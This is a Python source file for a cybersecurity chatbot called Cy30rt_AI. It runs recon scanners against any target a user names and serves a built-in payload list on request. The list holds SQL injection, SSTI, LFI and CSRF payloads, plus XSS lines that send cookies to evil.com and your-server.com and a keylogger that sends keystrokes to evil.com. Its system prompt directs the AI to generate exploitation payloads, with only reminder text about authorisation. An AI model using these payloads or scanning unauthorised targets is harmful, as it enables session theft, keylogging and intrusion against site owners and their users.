import os
import httpx
import subprocess
import json
import re
from groq import AsyncGroq
from typing import AsyncGenerator, Dict, List, Any

# API Keys
GROQ_API_KEY = os.getenv("GROQ_API_KEY")

class Cy30rtAI:
    """Professional Cybersecurity AI with Multi-Tool Bug Bounty Integration"""
    
    def __init__(self):
        self.groq_client = AsyncGroq(api_key=GROQ_API_KEY) if GROQ_API_KEY else None
        self.session_contexts = {}  # Store conversation context per session
        
        self.system_prompt = """You are Cy30rt_AI, a professional cybersecurity and bug bounty assistant created by Abdulbasid Yakubu (cy30rt).

CAPABILITIES:
- Remember previous conversations and provide contextual responses
- Support multiple languages including English, Hausa, Arabic, and 12+ others
- Run multiple reconnaissance tools (Amass, Subfinder, Assetfinder, Naabu, Nuclei, WhatWeb, Gobuster)
- Execute complete full recon workflows
- Analyze aggregated findings from all tools
- Generate exploitation payloads
- Provide step-by-step guidance

IMPORTANT RULES:
- ALWAYS remind users to ONLY test authorized targets
- NEVER encourage illegal hacking
- Provide complete, detailed responses
- Use natural language without markdown symbols
- When speaking Hausa, use proper Hausa grammar and vocabulary
- End responses with: "Stay secure. - Cy30rt_AI"""

        # Hausa language system prompt
        self.system_prompt_ha = """Kai Cy30rt_AI ne, mataimakin tsaro na kwamfuta kuma farautar bug bounty wanda Abdulbasid Yakubu (cy30rt) ya kirkiro.

IKON DA KAKE DA SHI:
- Ka tuna tattaunawar da ta gabata
- Ka yi amfani da Hausa da kyau sosai
- Ka gudanar da kayan aikin bincike (Amass, Subfinder, Naabu, Nuclei, WhatWeb, Gobuster)
- Ka samar da payloads
- Ka bincika CVEs
- Ka koyar da tsaro

DOKOKI:
- KA tuna kawai ka gwada kan abubuwan da aka ba ka izini
- KA taimaka wajen koyo kawai
- KA ba da cikakkun bayanai
- KA kammala da: "Zauna lafiya. - Cy30rt_AI"""

    # ============ CONVERSATION MEMORY ============
    
    def get_session_context(self, session_id: str) -> List[Dict]:
        """Retrieve conversation context for a session"""
        if session_id not in self.session_contexts:
            self.session_contexts[session_id] = []
        return self.session_contexts[session_id]
    
    def add_to_context(self, session_id: str, role: str, content: str):
        """Add message to conversation context"""
        if session_id not in self.session_contexts:
            self.session_contexts[session_id] = []
        self.session_contexts[session_id].append({"role": role, "content": content})
        
        # Keep only last 20 messages for context
        if len(self.session_contexts[session_id]) > 20:
            self.session_contexts[session_id] = self.session_contexts[session_id][-20:]
    
    def clear_session_context(self, session_id: str):
        """Clear conversation context for a session"""
        if session_id in self.session_contexts:
            del self.session_contexts[session_id]
    
    # ============ HAUSA LANGUAGE SUPPORT (Aya API) ============
    
    async def chat_in_hausa(self, message: str, context: List[Dict] = None) -> AsyncGenerator[str, None]:
        """Handle Hausa language queries using Aya model"""
        try:
            # Build messages with context
            messages = [{"role": "system", "content": self.system_prompt_ha}]
            
            # Add conversation context if available
            if context:
                for ctx in context[-5:]:  # Last 5 messages for context
                    messages.append({"role": ctx.get("role", "user"), "content": ctx.get("content", "")})
            
            messages.append({"role": "user", "content": message})
            
            # Use Groq with Llama model for Hausa (supports multiple languages)
            stream = await self.groq_client.chat.completions.create(
                model="llama-3.1-8b-instant",
                messages=messages,
                temperature=0.7,
                max_tokens=1500,
                stream=True
            )
            
            async for chunk in stream:
                if chunk.choices[0].delta.content:
                    yield chunk.choices[0].delta.content
                    
        except Exception as e:
            # Fallback response in Hausa
            yield f"Yi hakuri, na sami matsala. Ka sake gwadawa daga baya. - Cy30rt_AI\n\nError: {str(e)}"
    
    # ============ MULTI-TOOL RECONNAISSANCE INTEGRATION ============
    
    async def run_tool(self, tool_name: str, args: List[str], timeout: int = 120) -> str:
        """Execute a tool and capture output"""
        try:
            tool_paths = {
                "amass": "amass",
                "subfinder": "subfinder",
                "assetfinder": "assetfinder",
                "httpx": "httpx",
                "naabu": "naabu",
                "gobuster": "gobuster",
                "nuclei": "nuclei",
                "whatweb": "whatweb",
                "reconix": "reconix"
            }
            
            cmd = tool_paths.get(tool_name, tool_name).split() + args
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return f"Timeout: {tool_name} took longer than {timeout} seconds"
        except FileNotFoundError:
            return f"Tool not found: {tool_name} is not installed"
        except Exception as e:
            return f"Error running {tool_name}: {str(e)}"
    
    async def discover_subdomains(self, target: str) -> List[str]:
        """Combine multiple subdomain discovery tools"""
        subdomains = set()
        
        # Amass
        amass_result = await self.run_tool("amass", ["enum", "-d", target, "-silent"])
        for line in amass_result.split('\n'):
            if line.strip() and '.' in line:
                subdomains.add(line.strip())
        
        # Subfinder
        subfinder_result = await self.run_tool("subfinder", ["-d", target, "-silent"])
        for line in subfinder_result.split('\n'):
            if line.strip() and '.' in line:
                subdomains.add(line.strip())
        
        # Assetfinder
        assetfinder_result = await self.run_tool("assetfinder", [target])
        for line in assetfinder_result.split('\n'):
            if line.strip() and '.' in line:
                subdomains.add(line.strip())
        
        # Reconix subdomain extraction
        reconix_result = await self.run_tool("reconix", [target])
        for line in reconix_result.split('\n'):
            if '[SUBDOMAIN]' in line:
                sub = line.replace('[SUBDOMAIN]', '').strip()
                if sub:
                    subdomains.add(sub)
        
        return list(subdomains)
    
    async def scan_ports(self, target: str) -> List[Dict]:
        """Scan for open ports using Naabu"""
        ports_found = []
        
        naabu_result = await self.run_tool("naabu", ["-host", target, "-silent", "-timeout", "500"])
        
        for line in naabu_result.split('\n'):
            if ':' in line:
                parts = line.split(':')
                port = parts[-1].strip()
                ports_found.append({
                    "port": port,
                    "service": "unknown",
                    "tool": "naabu"
                })
        
        return ports_found
    
    async def detect_technologies(self, target: str) -> List[Dict]:
        """Detect web technologies using WhatWeb and Reconix"""
        technologies = []
        
        # WhatWeb detection
        whatweb_result = await self.run_tool("whatweb", ["--quiet", "--no-errors", target])
        if '[' in whatweb_result and ']' in whatweb_result:
            content = whatweb_result.split('[')[1].split(']')[0]
            techs = [t.strip() for t in content.split(',')]
            for tech in techs[:15]:
                technologies.append({"name": tech, "source": "whatweb", "confidence": "high"})
        
        # Reconix technology detection
        reconix_result = await self.run_tool("reconix", [target])
        for line in reconix_result.split('\n'):
            if '[TECH]' in line:
                tech = line.replace('[TECH]', '').strip()
                if tech and not any(t['name'] == tech for t in technologies):
                    technologies.append({"name": tech, "source": "reconix", "confidence": "medium"})
        
        return technologies
    
    async def run_full_recon(self, target: str) -> Dict[str, Any]:
        """Complete reconnaissance pipeline with all tools"""
        
        results = {
            "target": target,
            "subdomains": [],
            "ports": [],
            "technologies": [],
            "vulnerabilities": [],
            "directories": []
        }
        
        results["subdomains"] = await self.discover_subdomains(target)
        results["ports"] = await self.scan_ports(target)
        results["technologies"] = await self.detect_technologies(target)
        
        return results
    
    # ============ PAYLOAD DATABASE ============
    
    async def get_payloads(self, vuln_type: str) -> str:
        payloads = {
            "sqli": """💉 **SQL Injection Payloads**

**Authentication Bypass:**
' OR '1'='1' --
admin' --
' OR 1=1--

**Union-Based:**
' UNION SELECT null, username, password FROM users--
' UNION SELECT 1,2,3,4,5--
' UNION SELECT @@version, user(), database()--

**Time-Based:**
' AND SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0)--

**Error-Based:**
' AND extractvalue(1, concat(0x7e, version()))--
' AND updatexml(1, concat(0x7e, version()), 1)--""",
            
            "xss": """🔓 **XSS Payloads**

**Basic Alert:**
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

**Cookie Stealing:**
<script>fetch('https://your-server.com/steal?c='+document.cookie)</script>
<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">

**Keylogger:**
<script>document.onkeypress=function(e){fetch('https://evil.com/log?k='+e.key)}</script>""",
            
            "ssti": """🧠 **SSTI Payloads**

**Jinja2 (Python):**
{{7*7}}
{{config}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

**Twig (PHP):**
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}""",
            
            "lfi": """📂 **LFI/RFI Payloads**

**Basic LFI:**
../../../../etc/passwd
../../../etc/passwd%00
..\..\..\windows\win.ini

**PHP Wrappers:**
php://filter/convert.base64-encode/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=config.php""",
            
            "csrf": """🔄 **CSRF PoC Generator**

<img src="https://target.com/change-email?email=hacker@evil.com">

<form action="https://target.com/change-password" method="POST">
  <input type="hidden" name="password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>"""
        }
        
        return payloads.get(vuln_type, f"Payload type '{vuln_type}' not found. Available: sqli, xss, ssti, lfi, csrf")
    
    # ============ CVE LOOKUP ============
    
    async def lookup_cve(self, cve_id: str) -> str:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(f"https://cve.circl.lu/api/cve/{cve_id}")
                if response.status_code == 200:
                    data = response.json()
                    return f"""🔍 **{cve_id} Information**

**Summary:** {data.get('summary', 'No summary available')[:500]}

**CVSS Score:** {data.get('cvss', 'N/A')}

**Published:** {data.get('Published', 'N/A')}
**Modified:** {data.get('Modified', 'N/A')}

**Remediation:** Check vendor advisory for patches."""
                else:
                    return f"CVE {cve_id} not found. Check the ID format (e.g., CVE-2024-6387)"
        except Exception as e:
            return f"Error looking up CVE: {str(e)}"
    
    # ============ MAIN CHAT ROUTER ============
    
    async def chat(self, message: str, language: str = "en", context: List[Dict] = None, session_id: str = None) -> AsyncGenerator[str, None]:
        """Main chat endpoint - routes to appropriate function with context memory"""
        
        msg_lower = message.lower().strip()
        
        # Store message in session context
        if session_id:
            self.add_to_context(session_id, "user", message)
        
        # ============ HAUSA LANGUAGE HANDLING ============
        if language == "ha":
            async for chunk in self.chat_in_hausa(message, context):
                yield chunk
            return
        
        # ============ MULTI-TOOL RECON COMMANDS ============
        
        if msg_lower.startswith("/fullrecon"):
            target = msg_lower.replace("/fullrecon", "").strip()
            if target:
                yield f"🔍 Starting FULL reconnaissance on {target}\n\nRunning: Amass, Subfinder, Naabu, WhatWeb\n\n⏳ This will take 2-3 minutes...\n\nStay secure. - Cy30rt_AI"
                
                try:
                    results = await self.run_full_recon(target)
                    formatted = self.format_recon_results(results)
                    for line in formatted.split('\n'):
                        yield line + '\n'
                except Exception as e:
                    yield f"Error: {str(e)}\n\nTry using /recon {target} for a faster scan."
                return
            else:
                yield "Usage: /fullrecon <target>\n\nExample: /fullrecon scanme.nmap.org"
                return
        
        if msg_lower.startswith("/recon"):
            target = msg_lower.replace("/recon", "").strip()
            if target:
                yield f"🔍 Starting reconnaissance on {target}\n\n⏳ This will take 1-2 minutes...\n\nStay secure. - Cy30rt_AI"
                
                try:
                    cmd = ["reconix", target, "--deep", "--threads=10"]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
                    output = result.stdout + result.stderr
                    
                    results = f"✅ Recon Complete - {target}\n\n```\n{output[:3500]}\n```\n\n⚠️ Only test on authorized targets!\n\nStay secure. - Cy30rt_AI"
                    yield results
                except Exception as e:
                    yield f"Error: {str(e)}\n\nPlease ensure Reconix is installed."
                return
            else:
                yield "Usage: /recon <target>\n\nExample: /recon scanme.nmap.org"
                return
        
        # ============ PAYLOAD COMMANDS ============
        
        if msg_lower.startswith("/payload"):
            vuln_type = msg_lower.replace("/payload", "").strip()
            if vuln_type:
                result = await self.get_payloads(vuln_type)
                yield result
                return
            else:
                yield "Usage: /payload <type>\n\nAvailable: sqli, xss, ssti, lfi, csrf\n\nExample: /payload sqli"
                return
        
        # ============ CVE COMMANDS ============
        
        if msg_lower.startswith("/cve"):
            cve_id = msg_lower.replace("/cve", "").strip().upper()
            if cve_id:
                if not cve_id.startswith("CVE-"):
                    cve_id = f"CVE-{cve_id}"
                result = await self.lookup_cve(cve_id)
                yield result
                return
            else:
                yield "Usage: /cve CVE-YYYY-XXXX\n\nExample: /cve CVE-2024-6387"
                return
        
        # ============ HELP COMMAND ============
        
        if msg_lower in ["/help", "/commands", "/start"]:
            help_text = """🤖 **Cy30rt_AI Commands**

🔍 RECONNAISSANCE:
/recon <target> - Fast reconnaissance scan
/fullrecon <target> - Complete recon with all tools

💉 PAYLOADS:
/payload sqli - SQL injection payloads
/payload xss - XSS payloads  
/payload ssti - SSTI payloads
/payload lfi - LFI/RFI payloads

📋 INTELLIGENCE:
/cve <id> - Look up CVE information

💬 GENERAL:
/help - Show this help

⚠️ Always test only on authorized targets!

💡 The AI remembers previous messages - ask follow-up questions!

Stay secure. - Cy30rt_AI"""
            yield help_text
            return
        
        # ============ GENERAL AI QUESTIONS WITH CONTEXT ============
        
        if self.groq_client:
            try:
                # Build messages with context
                messages = [{"role": "system", "content": self.system_prompt}]
                
                # Add conversation context if available
                if context and len(context) > 0:
                    for ctx in context[-5:]:  # Last 5 messages for context
                        messages.append({"role": ctx.get("role", "user"), "content": ctx.get("content", "")})
                
                messages.append({"role": "user", "content": message})
                
                stream = await self.groq_client.chat.completions.create(
                    model="llama-3.1-8b-instant",
                    messages=messages,
                    temperature=0.7,
                    max_tokens=1500,
                    stream=True
                )
                
                full_response = ""
                async for chunk in stream:
                    if chunk.choices[0].delta.content:
                        content = chunk.choices[0].delta.content
                        full_response += content
                        yield content
                
                # Store response in session context
                if session_id:
                    self.add_to_context(session_id, "assistant", full_response)
                
                return
            except Exception as e:
                yield f"I am Cy30rt_AI, your cybersecurity assistant created by Abdulbasid Yakubu (cy30rt). How can I help you?\n\nError: {str(e)}"
        else:
            yield "I am Cy30rt_AI, your cybersecurity assistant. Type /help to see available commands!"
    
    def format_recon_results(self, results: Dict) -> str:
        """Format results for display"""
        report = f"✅ FULL RECON COMPLETE - {results['target']}\n\n"
        report += f"📊 Summary\n"
        report += f"• Subdomains found: {len(results['subdomains'])}\n"
        report += f"• Open ports: {len(results['ports'])}\n"
        report += f"• Technologies: {len(results['technologies'])}\n\n"
        
        if results['subdomains']:
            report += f"🔹 Subdomains (first 15):\n"
            for sub in results['subdomains'][:15]:
                report += f"  • {sub}\n"
            report += f"\n"
        
        if results['technologies']:
            report += f"🔹 Technologies Detected:\n"
            for tech in results['technologies'][:10]:
                report += f"  • {tech.get('name', 'Unknown')}\n"
            report += f"\n"
        
        report += f"⚠️ Only test on authorized targets!\n\nStay secure. - Cy30rt_AI"
        
        return report

# Singleton instance
cy30rt_ai = Cy30rtAI()
